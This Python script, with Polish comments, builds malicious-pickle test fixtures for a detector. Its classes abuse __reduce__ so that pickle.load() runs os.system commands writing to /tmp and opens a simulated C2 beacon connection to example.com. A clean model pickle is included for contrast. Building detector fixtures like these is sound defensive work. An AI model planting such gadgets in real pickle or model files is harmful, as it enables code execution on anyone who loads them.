"""Generator kontrolowanych plików PoC — fixture'y testowe dla detektora.

Każdy "złośliwy" plik wykorzystuje ten sam, dobrze udokumentowany mechanizm:
``__reduce__`` zwraca ``(callable, args)``, co pickle zapisuje jako
GLOBAL + REDUCE i wykonuje przy ``pickle.load()``.

Efekty są celowo **nieszkodliwe ale widoczne w logu**:
  * utworzenie pliku-znacznika w /tmp,
  * zapis krótkiego pliku tekstowego,
  * próba połączenia sieciowego (zablokowana przez ``--network=none``).

Żaden plik nie usuwa danych, nie modyfikuje niczego poza /tmp i nie wychodzi
poza kontener. Są to fixture'y do testowania własnego detektora — dokładnie
tak, jak robią to zestawy testowe picklescan i ModelScan.
"""

from __future__ import annotations

import os
import pickle

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")

MARKER = "/tmp/pwned"
WRITTEN_FILE = "/tmp/sandbox_poc_note.txt"


class TouchMarker:
    """PoC 1: wykonanie polecenia systemowego przez os.system."""

    def __reduce__(self):
        return (os.system, (f"touch {MARKER}",))


class WriteFile:
    """PoC 2: zapis pliku na dysku przez wywołanie powłoki."""

    def __reduce__(self):
        payload = "deserialization executed arbitrary code"
        return (os.system, (f"echo '{payload}' > {WRITTEN_FILE}",))


class NetworkBeacon:
    """PoC 3: próba połączenia wychodzącego (symuluje callback do C2).

    W sandboksie z ``--network=none`` połączenie się nie uda — chodzi
    o to, by log pokazał **próbę** i jej zablokowanie.
    """

    def __reduce__(self):
        import socket

        return (
            socket.create_connection,
            (("example.com", 80), 3),
        )


def _clean_model() -> dict:
    """Czysty, realistyczny "model" — wyłącznie typy wbudowane.

    Brak GLOBAL i REDUCE, więc parser statyczny nie ma co flagować.
    To jest kontrast dla dashboardu: zielony werdykt dla dobrego pliku.
    """
    return {
        "model_name": "handwriting-classifier",
        "architecture": "resnet50-head",
        "framework_version": "1.4.2",
        "classes": [chr(c) for c in range(ord("a"), ord("z") + 1)],
        "input_shape": [1, 3, 224, 224],
        "weights": {
            "fc.weight": [[round(0.01 * i + 0.001 * j, 5) for j in range(8)] for i in range(26)],
            "fc.bias": [round(0.002 * i, 5) for i in range(26)],
        },
        "normalization": {"mean": [0.485, 0.456, 0.406], "std": [0.229, 0.224, 0.225]},
    }


SAMPLES = {
    "evil_os_system.pkl": TouchMarker(),
    "evil_file_write.pkl": WriteFile(),
    "evil_network_beacon.pkl": NetworkBeacon(),
    "clean_model.pkl": _clean_model(),
}


def build(out_dir: str = SAMPLES_DIR) -> list[str]:
    os.makedirs(out_dir, exist_ok=True)
    written = []
    for name, obj in SAMPLES.items():
        path = os.path.join(out_dir, name)
        with open(path, "wb") as fh:
            pickle.dump(obj, fh, protocol=4)
        written.append(path)
    return written


if __name__ == "__main__":
    for path in build():
        print(f"zapisano {path} ({os.path.getsize(path)} B)")
    print(
        "\nUWAGA: pliki 'evil_*' wykonują kod przy pickle.load(). "
        "Otwieraj je WYŁĄCZNIE w sandboksie."
    )
